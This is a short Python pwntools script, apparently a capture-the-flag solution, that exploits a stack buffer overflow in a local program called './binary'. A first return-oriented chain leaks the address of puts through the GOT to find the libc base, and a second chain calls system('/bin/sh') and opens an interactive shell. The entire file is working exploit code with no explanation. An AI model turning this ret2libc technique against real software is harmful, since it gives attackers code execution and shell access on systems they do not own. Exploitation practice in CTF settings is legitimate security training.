from pwn import *
context.log_level='debug'
p=process("./binary")
e=ELF('./binary')
libc=ELF("/libc64.so")
p.recv()
payload='a'*0x10+'b'*8
payload+=p64(0x400673)+p64(e.got['puts'])+p64(e.plt['puts'])+p64(0x4005b6)
p.sendline(payload)
p.recvuntil("!\n")
libc.address=u64(p.recv(6)+"\x00\x00")-libc.symbols['puts']
print(hex(libc.address))
payload='a'*0x10+'b'*8
payload+=p64(0x400673)+p64(next(libc.search("/bin/sh")))+p64(libc.symbols['system'])
p.sendline(payload)
p.interactive()
